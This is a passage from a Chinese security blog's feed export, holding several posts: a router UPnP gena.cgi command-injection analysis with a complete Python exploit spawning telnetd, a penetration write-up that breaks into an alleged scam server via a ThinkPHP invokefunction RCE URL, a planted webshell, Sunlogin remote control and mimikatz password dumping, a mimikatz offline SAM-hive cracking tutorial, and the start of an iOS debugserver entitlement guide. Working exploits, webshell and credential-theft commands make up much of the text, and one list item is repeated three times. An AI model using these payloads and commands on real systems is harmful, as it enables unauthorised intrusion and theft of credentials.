class="line">pid = <span class="built_in">getpid</span>();</span><br><span class="line"><span class="built_in">sprintf</span>(buf8,</span><br><span class="line">        <span class="string">&quot;%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh&quot;</span></span><br><span class="line">        ,<span class="string">&quot;/htdocs/upnp/run.NOTIFY.php&quot;</span>,env_server_id,uri_service,env_http_callback + <span class="number">7</span>, http_callbak_uri+ <span class="number">1</span>,time_out</span><br><span class="line">        ,env_REMOTE_ADDR,<span class="string">&quot;/var/run&quot;</span>,uri_service,pid);</span><br><span class="line"><span class="built_in">xmldbc_ephp</span>(<span class="number">0</span>,<span class="number">0</span>,buf8,stdout);</span><br><span class="line">...........</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sprintf()格式化字符串,将各种拼接的输出格式化输入到buf8中，主要关注<code>SHELL_FILE</code>将以格式%s_%d.sh进行传递，主要用于为新的shell脚本命名。</br><br>随后由 xmldbc_ephp()函数(最后调用send())将“buffer8”中包含的数据发送给PHP。</br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">METHOD=SUBSCRIBE</span><br><span class="line">INF_UID=(NULL)</span><br><span class="line">SERVICE=<span class="string">&quot;9&quot;</span> <span class="comment">#漏洞就出在这里,我们可以控制SERVICE ，我们在这里如果输入`telnetd`，那他就会开启telnet服务</span></span><br><span class="line">HOST=<span class="string">&quot;192.168.0.1:49152&quot;</span></span><br><span class="line">URI=/ServiceProxy27&gt;</span><br><span class="line">TIMEOUT=1800</span><br><span class="line">REMOTE=<span class="string">&quot;192.168.0.2&quot;</span></span><br><span class="line">SHELL_FILE=<span class="string">&quot;/var/run/9_3120.sh&quot;</span></span><br></pre></td></tr></table></figure><ol><li><code>xmldbc_ephp</code>函数就不具体分析了，有兴趣的自己可以深入分析下，他大致内容是把buf8的数据传<code>run.NOTIFY.php</code>处理 缓冲区中的数据，经过xmldbc_ephp处理，由PHP文件run.NOTIFY.php进行处理。</li><li>run.NOTIFY.php调用<code>GENA_subscribe_new()</code>并传递cgibin程序中genacgi_main()函数获得的变量，还包括变量<code>SHELL_FILE</code>。</li><li><code>GENA_subscribe_new</code>函数传递SHELL_FILE 到 <code>GENA_notify_init</code>函数，也是SHELL_FILE最终处理的地方：通过调用 PHP 函数fwrite()创建新文件。</li><li><code>GENA_notify_init</code>函数中 fwrite() 函数被使用了两次 第一次创建文件，文件名为SHELL_FILE变量。</li><li>第二次调用fwrite()向文件中添加 删除命令 “rm -f “.$shell_file.”\n”，（漏洞点触发原因）：</li><li>进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到 反引号而失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。</li><li>进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到 反引号而失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。</li><li>进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到 反引号而失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。</li></ol><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144253485-2096627850.png" alt="4"> </p><h4 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP:"></a>构造EXP:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">httpSUB</span>(<span class="params">server, port, shell_file</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>.<span class="built_in">format</span>(host=server, port=port))</span><br><span class="line"></span><br><span class="line">    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    request  = <span class="string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="built_in">str</span>(shell_file) + <span class="string">&quot; HTTP/1.0\n&quot;</span> <span class="comment">#这里的shell_file就是我们反引号包裹的系统命令</span></span><br><span class="line">    request += <span class="string">&quot;Host: &quot;</span> + <span class="built_in">str</span>(server) + <span class="built_in">str</span>(port) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;NT: upnp:event\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Timeout: Second-1800\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Sending Payload&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    con.connect((socket.gethostbyname(server), port))</span><br><span class="line">    con.send(request.encode())</span><br><span class="line">    results = con.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Running Telnetd Service&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;telnet &#x27;</span> + <span class="built_in">str</span>(server) + <span class="string">&#x27; 9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">serverInput = <span class="string">&quot;192.168.0.1&quot;</span></span><br><span class="line">portInput = <span class="number">49152</span></span><br><span class="line">httpSUB(serverInput, portInput, <span class="string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="执行漏洞利用"><a href="#执行漏洞利用" class="headerlink" title="执行漏洞利用"></a>执行漏洞利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144328558-1556070785.png" alt="5"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144333692-1608751906.png" alt="6"> </p><p>欢迎各位大佬加群：研究PWN、RE、WEB安全等技巧</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144446707-81792468.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近在</summary>
      
    
    
    
    <category term="物联网安全" scheme="https://vxer-lee.github.io/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="路由器仿真" scheme="https://vxer-lee.github.io/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BB%BF%E7%9C%9F/"/>
    
  </entry>
  
  <entry>
    <title>渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器</title>
    <link href="https://vxer-lee.github.io/2021/06/02/WebSecurity/ThinkPHPAndSunHack/"/>
    <id>https://vxer-lee.github.io/2021/06/02/WebSecurity/ThinkPHPAndSunHack/</id>
    <published>2021-06-02T11:21:00.000Z</published>
    <updated>2021-08-16T07:59:32.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote><p>任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。</p></blockquote><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p><a href="http://www.xxxx.cn/login">http://www.xxxx.cn/login</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FrontFrame: Twitter Bootstrap,jQuery Sparklines,OWL Carousel,Font Awesome,JQuery:1.8.3,HTML5</span><br><span class="line">Widget: Access-Control</span><br><span class="line">Language: PHP&#x2F;7.1.13,PHP:7.1.13  (PHP框架)</span><br><span class="line">WebService: Nginx</span><br><span class="line">Other: Author:Mosaddek,Embed JSON</span><br><span class="line">xxx.xxx.xxx.xxx [香港 ThinkDream数据中心]</span><br><span class="line">域名注册商阿里巴巴云计算（北京）有限公司</span><br></pre></td></tr></table></figure><p>没识别到相关的CMS组件信息，我们进行手动操作，随便输入点什么让服务器报错回显有关信息。<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.cn&#x2F;apip.php</span><br><span class="line">回显：</span><br><span class="line">熟悉的面孔，thinkphp</span><br><span class="line">ThinkPHP V5.0.22 &#123; 十年磨一剑-为API开发设计的高性能框架 &#125; （ThinkPHP 5.0.22）</span><br><span class="line">THINK_PATH D:\phpStudy\PHPTutorial\WWW\xxx\thinkphp\ （Windows 服务器，phpStudy）</span><br><span class="line">Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j mod_fcgid&#x2F;2.3.9 （Apache）</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150536227-1656712009.png" alt="1"> </p><h2 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h2><p>知道了对方用的CMS和框架后，可以尝试用漏洞测试工具对其进行测试。<br>ThinkPHP漏洞取证小助手一顿撸!<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150638444-2002532457.png" alt="image-20210816150638045"><br>哦吼，返回404？？？？这是怎么回事呢？ 让我看看。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150805152-942618794.png" alt="image-20210530145844566"><br>返回404说明主站的路径默认不在根目录，通过测试发现在public目录。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150815077-2116059478.png" alt="image-20210530150052092"><br>我去访问WebShell的时候，返回了奇怪的错误提示模块不存在public，我想这应该是我的Shell1.php写到了后端根目录，即<code>phpStudy\www\xxx\shell1.php</code>，而网站管理员设置了只能访问前端目录即<code>nginx\html\dist-xx\index.html</code>，所以访问时候就会报错显示404 无法访问。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150917663-596583674.png" alt="image-20210816150917217"><br>（实验了下，确实前后端目录分离，在前端img目录下写入404.txt可正常访问到。）<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151116360-810544006.png" alt="image-20210531180824901"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151139779-938529109.png" alt="image-20210531180846255"><br>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#管理员配置了我们只能访问public目录，那我们就用绝对路径的方式找到public目录，并且写入一句话。</span><br><span class="line">#由ThinkPHP报错得知，public绝对路径如下</span><br><span class="line">PUBLIC_PATH  D:\phpStudy\PHPTutorial\WWW\xx\public\</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151221583-1867892045.png" alt="image-20210530152452017"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151235114-111641459.png" alt="image-20210530152606303"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151245322-1478852002.png" alt="image-20210530152647511"><br>写入phpinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1.php&amp;vars[1][]&#x3D;&lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>写入一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(xxxxxxxxx); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-一句话Shell"><a href="#0x03-一句话Shell" class="headerlink" title="0x03 一句话Shell"></a>0x03 一句话Shell</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151341165-695812818.png" alt="image-20210530152920940"> </p><h2 id="0x04-冰蝎-内网渗透"><a href="#0x04-冰蝎-内网渗透" class="headerlink" title="0x04 冰蝎 内网渗透"></a>0x04 冰蝎 内网渗透</h2><p>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip</a><br>冰蝎 一句话Shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行冰蝎</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151357371-102688335.png" alt="image-20210530154310972"><br>服务器信息收集：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来查看开了哪些进程，一般判断有哪些防火墙、杀毒软件</span></span><br><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure><p>将结果复制到这个网站中进行过滤<a href="https://maikefee.com/av_list">https://maikefee.com/av_list</a></p><h2 id="0x05-向日葵远控组合拳"><a href="#0x05-向日葵远控组合拳" class="headerlink" title="0x05 向日葵远控组合拳"></a>0x05 向日葵远控组合拳</h2><p>工具目录：</p><ul><li>sun.exe 向日葵</li><li>ggg.exe 绕过向日葵安装</li><li>new_mimi.exe 读取服务器密码</li><li>de_sun.exe 向日葵密码解密工具 (这个可以不用上传到远程服务器)</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151421989-42248780.png" alt="image-20210530165312741"> </p><p>将文件上传到 <code>C:/xxx/xxx/</code>目录<br>然后分别运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/&gt; ggg.exe  <span class="comment">#让向日葵以绿色模式运行，无须安装</span></span><br><span class="line">C:/xxx/xxx/&gt; sun.exe  <span class="comment">#运行向日葵</span></span><br></pre></td></tr></table></figure><blockquote><p>重要！！！</p><p>向注册表中写入向日葵安装信息成功，运行向日葵后无须安装。</p></blockquote><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151431381-744914.png" alt="image-20210530165806676"> </p><blockquote><p>运行sun.exe 向日葵后，会在C:\ProgramData目录多出一个Oray目录（向日葵配置信息）。</p><p>下载向日葵配置文件C:/ProgramData/Oray/SunloginClient/config.ini<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151447218-1031169864.png" alt="image-20210530170038380"><br>解析向日葵配置文件，提取验证码和密码</p><p>验证码：xxxxx</p><p>密码（加密）：gxfhaBnFFlQ=<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151507031-444365686.png" alt="image-20210530170228194"><br>在本机运行de_sun.exe，解密向日葵密码<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151557977-3317338.png" alt="image-20210530170417329"><br>向日葵</p><p>伙伴识别码：xxxxx</p><p>验证码：Tlm3S0</p></blockquote><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151609868-742170837.png" alt="image-20210530170552978"><br>成功连接上了远程服务器的向日葵，但是需要账号密码解锁！<br>上传组合拳里面的 new_mimi.exe 到远程服务器，运行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/ &gt;new_mimi.exe</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151620028-226874935.png" alt="image-20210530170737867"><br>提取出账号密码</p><blockquote><p>远程服务器账号密码信息</p><p>Username : Administrator<br>Domain   :<br>Password : 12345678911</p></blockquote><h2 id="0x06-利用成功"><a href="#0x06-利用成功" class="headerlink" title="0x06 利用成功"></a>0x06 利用成功</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151636040-1318970692.png" alt="image-20210530170923013"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151650462-1434249605.png" alt="image-20210530171012224"><br>：)可以看到管理员在偷偷看注册的用户信息，我确认了服务器管理员不在操作，于是进行了进一步取证，得到了管理员的真实ip地址，上面还有一个百度网盘，里面有管理员的账号信息，接下来就是将信息交给警察叔叔处理吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;block</summary>
      
    
    
    
    <category term="Web安全" scheme="https://vxer-lee.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ThinkPHP漏洞" scheme="https://vxer-lee.github.io/tags/ThinkPHP%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="内网渗透" scheme="https://vxer-lee.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Mimikatz离线破解Windows登陆密码</title>
    <link href="https://vxer-lee.github.io/2020/11/13/Forensics/mimikatz/"/>
    <id>https://vxer-lee.github.io/2020/11/13/Forensics/mimikatz/</id>
    <published>2020-11-13T03:50:11.000Z</published>
    <updated>2021-08-16T07:57:57.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>首先导出两个文件，可能需要管理员权限 ，CMD或者Powershell运行都可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144631614-387470361.png" alt="1"> </p><p>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试</p><p>mimikatz下载链接：<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809</a></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144641018-1570866180.png" alt="2"> </p><p>运行mimikatz，输入命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144703067-2076311006.png" alt="ntlm"><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144709916-651092097.png" alt="123456"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;


&lt;h2 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h2&gt;&lt;p&gt;已获取system权限，无法</summary>
      
    
    
    
    <category term="电子取证" scheme="https://vxer-lee.github.io/categories/Forensics/"/>
    
    
    <category term="Windows密码破解" scheme="https://vxer-lee.github.io/tags/Windows%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>iOS 动态调试のdebugserver</title>
    <link href="https://vxer-lee.github.io/2020/02/06/iOSRe/iOSRe_debugserver/"/>
    <id>https://vxer-lee.github.io/2020/02/06/iOSRe/iOSRe_debugserver/</id>
    <published>2020-02-06T09:30:34.000Z</published>
    <updated>2021-08-16T07:58:08.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><blockquote><p>iOS逆向里面比较重要的几项技能：动态调试、静态分析、HOOK关键函数、重签名</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先来讲下动态调试，iOS动态调试需要一个服务端和客户端程序，服务端程序在手机上监听要动态调试程序的进程ID或是程序名，客户端程序在Mac OS系统上运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务端程序:debugserver</span><br><span class="line">客户端程序:lldb</span><br><span class="line"><span class="comment">#这两个程序不用额外的去外网下载，只要你的Mac电脑有装XCode，并且进行真机调试过（真机调试一般可以在淘宝买UDID开发者证书，就是和你手机UDID绑定的证书那么你就可以在你手机上安装开发你的APP|土豪（开发者账号））</span></span><br></pre></td></tr></table></figure><p>只要你手机进行真机调试过，那么在你手机的这个目录下就会有debugserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/Developer/usr/<span class="built_in">bin</span>/debugserver</span><br><span class="line"><span class="comment">#不过这个debugserver 默认只能调试自己开发的APP，我们逆向当然是要逆别人的程序，所以想要debugserver能调试三方APP，需要进行一些修改，下面就是修改的一些重点。</span></span><br></pre></td></tr></table></figure><h2 id="配置debugserver-赋予权限"><a href="#配置debugserver-赋予权限" class="headerlink" title="配置debugserver 赋予权限"></a>配置debugserver 赋予权限</h2><p>debugserver默认只能调试自己开发的应用，调试其他应用会抛异常<code>unable to start the exception thread</code>。默认的debugserver缺少<code>task_for_pid()</code>权限，因此需要给debugserver赋予task_for_pid权限。——这是网上摘抄的话</p><h3 id="网上过时方法"><a href="#网上过时方法" class="headerlink" title="网上过时方法"></a>网上过时方法</h3><p>我发现网上配置debugserver的方法已经过时，不适用iOS13系统，导致debugserver还是无法调试三方APP，所以按照如下方法进行。</p><h3 id="iOS13及以上配置方法"><a href="#iOS13及以上配置方法" class="headerlink" title="iOS13及以上配置方法"></a>iOS13及以上配置方法</h3><h4 id="新建一个文件名为ent-xml"><a href="#新建一个文件名为ent-xml" class="headerlink" title="新建一个文件名为ent.xml"></a>新建一个文件名为ent.xml</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">plist</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="meta-string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.backboardd.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.backboardd.launchapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.diagnosticd.diagnostic<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.frontboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.frontboard.launchapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.network.client<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.security.network.server<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.springboard.debugapplications<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.system-task-ports<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>get-task-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>platform-application<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span 